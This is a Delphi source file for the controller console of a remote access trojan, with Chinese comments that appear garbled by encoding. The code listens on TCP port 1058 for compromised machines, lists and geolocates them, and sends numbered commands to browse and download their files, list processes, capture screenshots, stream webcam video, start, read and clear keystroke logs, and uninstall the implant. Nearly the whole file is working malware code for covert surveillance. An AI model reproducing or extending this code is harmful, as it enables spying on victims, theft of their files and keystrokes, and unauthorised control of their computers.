unit Unit1;
{����BLOG ALALMN JACK     http://hi.baidu.com/alalmn  
Զ�̿��ƺ�ľ���дȺ30096995   }

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ExtCtrls, ComCtrls, ToolWin, StdCtrls, ImgList, OleCtrls,
  SHDocVw, WinSkinData, IdComponent, IdTCPServer, IdBaseComponent,
  IdAntiFreezeBase, IdAntiFreeze,   shellapi,jpeg,untTQQWry;

type
  TForm1 = class(TForm)
    MainMenu1: TMainMenu;
    N1: TMenuItem;
    N2: TMenuItem;
    N3: TMenuItem;
    N4: TMenuItem;
    N5: TMenuItem;
    N6: TMenuItem;
    N7: TMenuItem;
    N8: TMenuItem;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    StatusBar1: TStatusBar;
    ListView1: TListView;
    ImageList1: TImageList;
    WebBrowser1: TWebBrowser;
    IdAntiFreeze1: TIdAntiFreeze;
    SaveDialog1: TSaveDialog;
    IdTCPServer1: TIdTCPServer;
    SkinData1: TSkinData;
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    ToolButton2: TToolButton;
    ToolButton3: TToolButton;
    ToolButton4: TToolButton;
    ToolButton5: TToolButton;
    ToolButton6: TToolButton;
    ToolButton7: TToolButton;
    ToolButton8: TToolButton;
    ToolButton9: TToolButton;
    ToolButton10: TToolButton;
    ToolBar2: TToolBar;
    Panel1: TPanel;
    Label1: TLabel;
    ComboBox1: TComboBox;
    Panel2: TPanel;
    Label2: TLabel;
    Label3: TLabel;
    Edit1: TEdit;
    Edit2: TEdit;
    Button1: TButton;
    ToolButton22: TToolButton;
    PopupMenu1: TPopupMenu;
    N9: TMenuItem;
    ImageList2: TImageList;
    procedure FormCreate(Sender: TObject);
    procedure ToolButton9Click(Sender: TObject);
    procedure ToolButton10Click(Sender: TObject);
    procedure ToolButton1Click(Sender: TObject);
    procedure ToolButton2Click(Sender: TObject);
    procedure N4Click(Sender: TObject);
    procedure N6Click(Sender: TObject);
    procedure N5Click(Sender: TObject);
    procedure N8Click(Sender: TObject);
    procedure ToolButton3Click(Sender: TObject);
    procedure ToolButton4Click(Sender: TObject);
    procedure ToolButton5Click(Sender: TObject);
    procedure ToolButton6Click(Sender: TObject);
    procedure ToolButton22Click(Sender: TObject);
    procedure N9Click(Sender: TObject);
    procedure IdTCPServer1Disconnect(AThread: TIdPeerThread);
    procedure IdTCPServer1Execute(AThread: TIdPeerThread);
    procedure FormDestroy(Sender: TObject);
    procedure ListView1Change(Sender: TObject; Item: TListItem;
      Change: TItemChange);
    procedure ListView1Click(Sender: TObject);
    procedure ToolButton7Click(Sender: TObject);
    procedure ToolButton8Click(Sender: TObject);
    procedure N7Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    FleshIPList: TStringlist; {���IP����λ�õ��б�}
    procedure ZhuDongCmdSend(Miling, Qita: string;isbreak:Boolean);      //��Ϣ�ķ���
    function SendStreamToServer(AThread:TIdPeerThread;Cmd:String): Boolean;
     function GetIPtoAdder(IpName: string): string;
     procedure IdTCPServer1WorkBegin(Sender: TObject; AWorkMode: TWorkMode; const AWorkCountMax: Integer);
     procedure IdTCPServer1WorkEnd(Sender: TObject; AWorkMode: TWorkMode);
     procedure IdTCPServer1Work(Sender: TObject;AWorkMode: TWorkMode; const AWorkCount: Integer);
  end;

  type // �������ĻỰ��Ϣ��
  Ponlineinf = ^Tonlineinf;
  Tonlineinf = record
    ServerName: string[30];   {��������������}
    AThread : TIdPeerThread;  {�������߳�}
    Soc: integer;             {�������߳�ID}
    ServerAdd: string[15];    {������IP��ַ}
    AdderStr: string;         {����λ��}
  end;

var
  Form1: TForm1;
  CurrentThread: TIdPeerThread;
  MyFirstBmp:TMemoryStream;
  OnlineServer: array[0..100] of Tonlineinf;
  count:integer;
   // SysDev: TSysDevEnum;
   // Videolist:TStringlist;

implementation
uses
Unit2,Unit3,Unit4,Unit5,Unit6,Unit7,Unit8,Unit9,Unit11,Unit12,Unit13;
 {Unit2     //FTP����
  Unit3     //���������
  Unit4     //Զ����Ļ���
  Unit5     //��Ƶ���
  Unit6     //Զ���ļ�����
  Unit7     //���̹���
  Unit8     //����
  Unit9     //�������
  untTQQWry //IP���ݿ�
  Unit10    //�½��ļ���
  Unit11    //���в�������
  Unit12    //���ڹ���
  Unit13    //���̼�¼
  }

{$R *.dfm}
procedure Tform1.ZhuDongCmdSend(Miling, Qita: string;isbreak:Boolean);
begin
 form1.Enabled :=  isbreak;  //ֹͣ
  try
    if not SendStreamToServer(CurrentThread,Miling+#13+Qita) then
    begin
     showmessage('���ӳ���!');
     exit;
    end;
  except
    form1.Enabled := True;    //��
  end;
   form1.Enabled := True;     //��
end;

function Tform1.SendStreamToServer(AThread:TIdPeerThread;Cmd:String): Boolean;
var
  MyStream: TMemoryStream;
  i:integer;
begin
  try
    MyStream:=TMemoryStream.Create;
    MyStream.Write(Cmd[1],Length(Cmd));
    MyStream.Position:=0;
    i:=MyStream.size;
    AThread.Connection.WriteLn(inttostr(i));
    AThread.Connection.WriteStream(MyStream);
    Result := True;
  except
    AThread.Connection.Disconnect;
    AThread.Terminate;
    MyStream.Free;
    Result := False;
  end;
    MyStream.Free;
end;

function getfilesize(str: string): string;
var len: integer;
begin
    len := pos('|', str); //�ļ���Ŀ¼��Ҫ����
    result := copy(str, 1, len - 1);
end;

function Tform1.GetIPtoAdder(IpName: string): string; {��IP��ַ�õ����ڵ���λ��}
var
  QQWry: TQQWry;
  slIPData: TStringlist;
  IPRecordID: int64;
begin
  Result := '';
  try
      QQWry:=TQQWry.Create(ExtractFilePath(Paramstr(0)) + 'QQWry.dat');
      IPRecordID:=QQWry.GetIPDataID(IpName);
      slIPData:=TStringlist.Create;
      QQWry.GetIPDataByIPRecordID(IPRecordID, slIPData);
      QQWry.Destroy;
      Result := slIPData[3];
     // (format('ID: %d IP: %s - %s ����: %s ����: %s', [IPRecordID, slIPData[0], slIPData[1], slIPData[2], slIPData[3]]));
      slIPData.Free;
  except //IP��ַ��ʽ����!
    Result := 'IP��ַ��ʽ����!';
  end; //
  if Result = '' then Result :='��δ֪���ݡ�' ;
end;

function ReadSeverStream(AThread: TIdPeerThread; var TempStr: string): Boolean;    //��ȡ��
var
  RsltStream: TMemoryStream;
  TheSize:integer;
begin
  try
    RsltStream := TmemoryStream.Create;
    TheSize := AThread.Connection.ReadInteger;
    AThread.Connection.ReadStream(RsltStream, TheSize, False);
    RsltStream.Position := 0;
    SetLength(TempStr, RsltStream.Size);
    RsltStream.Read(TempStr[1],RsltStream.Size);
    Result := True;
  except
    AThread.Connection.Disconnect;
    AThread.Terminate;
    RsltStream.Free;
    Result := False;
  end;
    RsltStream.Free;
end;

//////////////////////////////////////////////////////////////////////////////////////////////////
procedure TForm1.FormCreate(Sender: TObject);
var
  IPFile: string;
  MyStream: TMemoryStream;
  MyStream1: TMemoryStream;
begin
   count:=0;   //��շ�ֹ���ݵĳ���
   MyFirstBmp:=TMemoryStream.Create;     //������
   IdTCPServer1.DefaultPort:=1058;    //���ü����˿�
    IdTCPServer1.Active:=true;        //�����ؼ�
   if  IdTCPServer1.Active then       //�жϿ���û
   StatusBar1.Panels.Items[0].Text:='�������˿�1058�ɹ�,��ȴ����������!';
   StatusBar1.Panels.Items[1].Text:='��������0̨';
   WebBrowser1.Navigate('http://hi.baidu.com/alalmn');    //����վ
end;

procedure TForm1.ToolButton9Click(Sender: TObject);
begin       //��С��
    application.Minimize;
end;

procedure TForm1.ToolButton10Click(Sender: TObject);
begin
   close;   //�˳�����
end;

procedure TForm1.ToolButton1Click(Sender: TObject);
begin
  ftp.Show;  //����IP
end;

procedure TForm1.ToolButton2Click(Sender: TObject);
begin
server.Show;  //���������
end;

procedure TForm1.N4Click(Sender: TObject);
begin
  ftp.Show;  //����IP
end;

procedure TForm1.N6Click(Sender: TObject);
begin
server.Show;  //���������
end;

procedure TForm1.N5Click(Sender: TObject);
begin
close;    //�˳�
end;

procedure TForm1.N8Click(Sender: TObject);
begin
   ShellExecute(0,nil,PChar('http://hi.baidu.com/alalmn'), nil, nil, SW_NORMAL);
end;

procedure TForm1.ToolButton3Click(Sender: TObject);
begin
    ZhuDongCmdSend('050', '', false);
   // pingmu.Show;   //Զ����Ļ���
end;

procedure TForm1.ToolButton4Click(Sender: TObject);
begin
shipin.Show;     //��Ƶ���
end;

procedure TForm1.ToolButton5Click(Sender: TObject);
var
i:integer;
begin
  //  if SendStreamToServer(CurrentThread,'001') then
 // CurrentThread.Connection.WriteLn('001');
     for i:=0 to wenjian.TreeView1.Items.Count-1 do
     begin
     if wenjian.TreeView1.Items.Item[i].ImageIndex=6 then
      begin
        if wenjian.TreeView1.Items.Item[i].HasChildren then
           wenjian.TreeView1.Items.Item[i].DeleteChildren;
           wenjian.TreeView1.Items.Item[i].Delete;
           break;  //ֹͣ
      end;
     end;
wenjian.Show;   //Զ���ļ�����
end;

procedure TForm1.ToolButton6Click(Sender: TObject);
begin
   ZhuDongCmdSend('020','',false);
   jincheng.Show;   //���̹���
end;

procedure TForm1.ToolButton22Click(Sender: TObject);
begin
ALALMN.Show;    //������ϵ
end;

procedure TForm1.N9Click(Sender: TObject);
begin
   if MessageBox(Application.Handle,'��ȷ��Ҫж��Զ�̷�����������㽫ʧȥ��Զ�������Ŀ���!','��ʾ!',MB_OKCANCEL)=1 then
      ZhuDongCmdSend('080','',false);      //��Զ�̷���ж��ָ��
end;

///////////////////////////////////////////////////////////////////////////////////////////////////////

procedure TForm1.IdTCPServer1Disconnect(AThread: TIdPeerThread);
var
i,j:integer;
begin     //�Ͽ���ӳ
    for i:=0 to count-1 do
    begin
     if  OnlineServer[i].Soc = AThread.ThreadID then
     begin
        for j:=0 to ListView1.Items.Count-1 do   //�������� ��������(����)����
        begin
          if ListView1.Items.Item[j].Caption = OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) then
          begin
              ListView1.Items.Item[j].Delete;   //ɾ��ListView1������
              StatusBar1.Panels.Items[1].Text:='��������'+inttostr(ListView1.Items.Count)+'̨';   //IdTCPServer1�Ͽ���ӦΪ��ListView1���������ȫ��ɾ������ʱӦ����ʾΪ0�Ŷ�
              break;     //ֹͣ
          end;
        end;
        j:=i;
        while j < count-1 do
        begin
         OnlineServer[j].ServerName:=OnlineServer[j+1].ServerName;
         OnlineServer[j].AThread:=OnlineServer[j+1].AThread;
         OnlineServer[j].Soc:= OnlineServer[j+1].Soc;
         OnlineServer[j].ServerAdd:=OnlineServer[j+1].ServerAdd;
         OnlineServer[j].AdderStr:= OnlineServer[j+1].AdderStr;
         inc(j);
        end;
       dec(count);
       break; //ֹͣ
      end;

    end;
end;


procedure TForm1.IdTCPServer1Execute(AThread: TIdPeerThread);
var
  MyStream: TMemoryStream;
  RecCMD,TempStr: string;
  ListItem:TListItem;
  RootDStrList: TStringList;
  Tmpmemo: TStringlist;
  TheLItem: TListItem;
  tmplinestr, symbolstr, tmptimestr: string;
  Drivernum, i,j:integer;
  TMP: TTreeNode;
  BufferLen: Integer;
  MyBuffer: array[0..1000000] of byte;
  memStream: TMemoryStream;
  jpg: TJpegImage;
  ASize:Int64;
  AFileStream: TFileStream;
begin         //ִ�з�ӳ
   try
    RecCMD:=AThread.Connection.ReadLn();
   except
       try
       AThread.Connection.Disconnect;
       AThread.Terminate;
       except
       end;
     Exit;
   end;
   case strtoint(RecCMD) of    //��ʼѭ��000 �鿴Զ����Ϣ�Ĵ���
000: begin
      if ReadSeverStream(AThread,TempStr) then
      begin
       Tmpmemo:= TStringlist.Create;
       Tmpmemo.Clear;
       Tmpmemo.Text:= TempStr;
       OnlineServer[count].ServerName:= Tmpmemo.Strings[0];
       OnlineServer[count].AThread:=AThread;
       OnlineServer[count].Soc:= AThread.ThreadID;
       OnlineServer[count].ServerAdd:= AThread.Connection.Socket.Binding.PeerIP;
       ListItem:= ListView1.Items.Add;
       ListItem.Caption:=OnlineServer[count].ServerName+'-'+inttostr(OnlineServer[count].Soc);
       ListItem.SubItems.Add(OnlineServer[count].ServerAdd);
       ListItem.SubItems.Add(Form1.GetIPtoAdder(AThread.Connection.Socket.Binding.PeerIP));
       ListItem.SubItems.Add(Tmpmemo.Strings[1]);
       ListItem.ImageIndex:=0;
       inc(count);
       Tmpmemo.Free;
      end;
     end;
001: begin
       wenjian.Enabled:=false;
       if ReadSeverStream(AThread,TempStr) then
       begin
       RootDStrList:=TStringList.Create;
       RootDStrList.Text := TempStr;
       wenjian.ListView1.Items.Clear;
           if wenjian.Treeview1.Selected.HasChildren then
              wenjian.Treeview1.Selected.DeleteChildren;

           for i := 0 to RootDStrList.Count - 1 do
            begin
             if RootDStrList[i] = '' then Break;  //ֹͣ
             TempStr := Copy(RootDStrList[i], 1, 2);
              TMP := wenjian.Treeview1.items.AddChild(wenjian.Treeview1.Selected, TempStr);
             Drivernum := StrtoInt(Copy(RootDStrList[i], 3, 1));

              TMP.ImageIndex :=7;
              TMP.SelectedIndex := 7;

               TMP := wenjian.Treeview1.items.AddChild(TMP, 'Loading...');
               TMP.ImageIndex := -1;
               TMP.SelectedIndex := -1;
               with wenjian.ListView1.Items.Add do
                 begin
                  Caption := TempStr;
                  subitems.text :=' ';
                  ImageIndex := 2;
                 end;
            end;

       end;
       wenjian.Enabled:=true;
     end;
002: begin
       wenjian.Enabled:=false;
        if ReadSeverStream(AThread,TempStr) then
        begin
          Tmpmemo:= TStringlist.Create;
          Tmpmemo.Clear;
          Tmpmemo.Text:= TempStr;

        if Tmpmemo.Text='' then
         begin
          Tmpmemo.Free;
          wenjian.Enabled:=true;
          Exit;
        end;
       wenjian.Treeview1.items.Delete(wenjian.Treeview1.Selected.getFirstChild);
       for i:=0 to Tmpmemo.Count-1 do
       begin
        Tmplinestr := Tmpmemo.Strings[i];
        Symbolstr := Copy(tmplinestr, 1, 1);
        Tmptimestr := Copy(tmplinestr, 2, 16);
        Delete(tmplinestr, 1, 17);
       if symbolstr = '*' then
       begin
        TMP := wenjian.Treeview1.items.AddChild(wenjian.Treeview1.Selected, Tmplinestr);
        TMP.ImageIndex := 8;
        TMP.SelectedIndex := 9;
        TMP := wenjian.Treeview1.items.AddChild(TMP, '.');
        TMP.ImageIndex := -1;
        TMP.SelectedIndex := -1;
        with wenjian.ListView1.Items.Add do
        begin
          Caption := tmplinestr;
          subitems.text := ' ';
          wenjian.ListView1.Items.Item[i].SubItems.Add(Tmptimestr);
          ImageIndex := 3;
        end;
       end;
      if symbolstr = '\' then
        begin
        with wenjian.ListView1.Items.Add do
        begin
         Caption := copy(tmplinestr, length(getfilesize(tmplinestr)) + 2, length(tmplinestr));
         subitems.text := getfilesize(tmplinestr);
          ImageIndex :=5 ;
        end;
       end;
       end;


        end;
       wenjian.Enabled:=true;
     end;
013:begin
     try
      AFileStream := TFileStream.Create(SaveDialog1.FileName, fmCreate);
      AThread.Connection.OnWork:=  Form1.IdTCPServer1Work;
      AThread.Connection.OnWorkBegin:=Form1.IdTCPServer1WorkBegin;
      AThread.Connection.OnWorkEnd:=  Form1.IdTCPServer1WorkEnd;
      ASize:= AThread.Connection.ReadInteger();
      AThread.Connection.ReadStream(AFileStream, ASize);
      finally
      AFileStream.Free;
      end;
    end;
020:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
     jincheng.ListView1.Items.Clear;
     Tmpmemo := TStringList.Create;
     Tmpmemo.Text:=TempStr;
     // ----���
               j := 0;
          for i := 0 to Tmpmemo.Count - 1 do
          begin
            if Tmpmemo.Strings[i] = '' then break;   //ֹͣ
            j := j + 1;
            if j = 1 then
            begin
              TheLItem :=jincheng.ListView1.Items.Add;
              TheLItem.Caption := Tmpmemo[i];
            end;
            if j = 2 then TheLItem.SubItems.Add(Tmpmemo[i]);
            if j = 3 then TheLItem.SubItems.Add(Tmpmemo[i]);
            if j = 4 then
            begin
              if StrToInt(Tmpmemo[i]) <= 2 then TheLItem.SubItems.Add('��ȱ') else
                if StrToInt(Tmpmemo[i]) <= 4 then TheLItem.SubItems.Add('��') else
                  if StrToInt(Tmpmemo[i]) <= 6 then TheLItem.SubItems.Add('���ڱ�׼') else
                    if StrToInt(Tmpmemo[i]) <= 8 then TheLItem.SubItems.Add('��׼') else
                      if StrToInt(Tmpmemo[i]) <= 10 then TheLItem.SubItems.Add('���ڱ�׼') else
                        if StrToInt(Tmpmemo[i]) <= 13 then TheLItem.SubItems.Add('��') else
                          if StrToInt(Tmpmemo[i]) <= 24 then TheLItem.SubItems.Add('ʵʱ') else
                            TheLItem.SubItems.Add('��ȱ');
            end;
            if j = 5 then
            begin
              TheLItem.SubItems.Add(Tmpmemo[i]);
              j := 0;
            end;
          end;
          Tmpmemo.Free;

      end;

    end;
030:begin
        MyStream:=TMemoryStream.Create;
        i := AThread.Connection.ReadInteger;
        AThread.Connection.ReadStream(MyStream, i, False);
        MyStream.Position := 0;
       chuanko.ListBox1.Items.LoadFromStream(MyStream);
        MyStream.Free;
    end;
040:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
       if TempStr='Cmd009' then
         jianpan.Memo1.Lines.Add('�������̼�¼�ɹ�!�鿴��¼ǰ������ֹ���̼�¼!');
       if TempStr='Cmd010' then
         jianpan.Memo1.Lines.Add('���̼�¼�Ѿ���������!');
      end;
    end;
041:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
        if TempStr='Cmd012' then
          jianpan.Memo1.Lines.Add('��ֹ���̼�¼�ɹ�!');
      end;
    end;
042:begin
        MyStream:=TMemoryStream.Create;
        i := AThread.Connection.ReadInteger;
        AThread.Connection.ReadStream(MyStream, i, False);
        MyStream.Position := 0;
        jianpan.Memo1.Lines.LoadFromStream(MyStream);
        MyStream.Free;
    end;
043:begin
      if ReadSeverStream(AThread,TempStr) then
      begin
      if TempStr='Cmd014' then
         jianpan.Memo1.Lines.Add('��ռ��̼�¼���!');
      end;
    end;
050:begin
     BufferLen:= AThread.Connection.ReadInteger();
     AThread.Connection.ReadBuffer(MyBuffer,BufferLen);
     MyFirstBmp.Clear;
     MyFirstBmp.Write(MyBuffer,BufferLen);
     MyFirstBmp.Position := 0;
     pingmu.Show;   //������Ļ�鿴
     pingmu.Image1.Picture.Bitmap.LoadFromStream(MyFirstBmp);
    end;
060:begin
   try
 //   repeat
    while AThread.Connection.Connected do
    begin
    memStream := TMemoryStream.Create;
    BufferLen := AThread.Connection.ReadInteger;
    memStream.Size := BufferLen;
    AThread.Connection.ReadBuffer(memStream.Memory^, BufferLen);
    jpg := TJpegImage.Create;
    jpg.LoadFromStream(memStream);
    shipin.Image1.Picture.Bitmap.Assign(jpg);
    jpg.Free;
    memStream.Free;
  //  until (AThread.Connection.Connected=False);
    end;
   except
   end;
   end;
061:begin                      //���⵽����ͷ
     for i:=0 to count-1 do
     begin
      if  OnlineServer[i].Soc = AThread.ThreadID then
      begin
        for j:=0 to ListView1.Items.Count-1 do
          if ListView1.Items.Item[j].Caption = OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) then
          begin
              ListView1.Items.Item[j].ImageIndex:= 1;
              break;   //ֹͣ
          end;
      end;
    end;
   end;
062:begin
     for i:=0 to count-1 do
     begin
      if  OnlineServer[i].Soc = AThread.ThreadID then
      begin
        for j:=0 to ListView1.Items.Count-1 do
          if ListView1.Items.Item[j].Caption = OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) then
          begin
              ListView1.Items.Item[j].ImageIndex:= 0;
              break;  //ֹͣ
          end;
      end;
    end;
    end;
064:begin
     if ReadSeverStream(AThread,TempStr) then
        shipin.StatusBar1.SimpleText:=TempStr;
    end;
   end;  //end case
end;

procedure TForm1.IdTCPServer1WorkBegin(Sender: TObject; AWorkMode: TWorkMode; const AWorkCountMax: Integer);
begin
  try
    jindu.Gauge1.Progress := 0;
    jindu.Gauge1.MaxValue := AWorkCountMax;
  except
  end;
end;

procedure TForm1.IdTCPServer1WorkEnd(Sender: TObject; AWorkMode: TWorkMode);
begin
   jindu.Close;
end;

procedure TForm1.IdTCPServer1Work(Sender: TObject;AWorkMode: TWorkMode; const AWorkCount: Integer);
begin
  try
    jindu.Gauge1.Progress := AWorkCount;
    Application.ProcessMessages;
  except
  end;
end;


procedure TForm1.FormDestroy(Sender: TObject);
begin
     MyFirstBmp.Free;    //�ͷ��ڴ�
     FleshIPList.Free;
end;

procedure TForm1.ListView1Change(Sender: TObject; Item: TListItem;
  Change: TItemChange);
begin
   StatusBar1.Panels.Items[1].Text:='��������'+inttostr(ListView1.Items.Count)+'̨';
end;

procedure TForm1.ListView1Click(Sender: TObject);
var
i:integer;
begin
    //showmessage(inttostr(ListView1.ItemIndex ));
    if ListView1.Items.Count<>0 then
    if ListView1.ItemIndex <> -1 then
   for i:=0 to count-1 do
    begin
     if  OnlineServer[i].ServerName+'-'+inttostr(OnlineServer[i].Soc) =ListView1.Items.Item[ListView1.ItemIndex ].Caption then //ListView1.Selected.Caption then
     begin
        CurrentThread:= OnlineServer[i].AThread;
        break;    //ֹͣ
     end;
    end;
end;

procedure TForm1.ToolButton7Click(Sender: TObject);
begin
   ZhuDongCmdSend('030','',false);
   chuanko.Show;
end;

procedure TForm1.ToolButton8Click(Sender: TObject);
begin
   jianpan.Show;
end;

procedure TForm1.N7Click(Sender: TObject);
begin
ALALMN.Show;
end;

end.
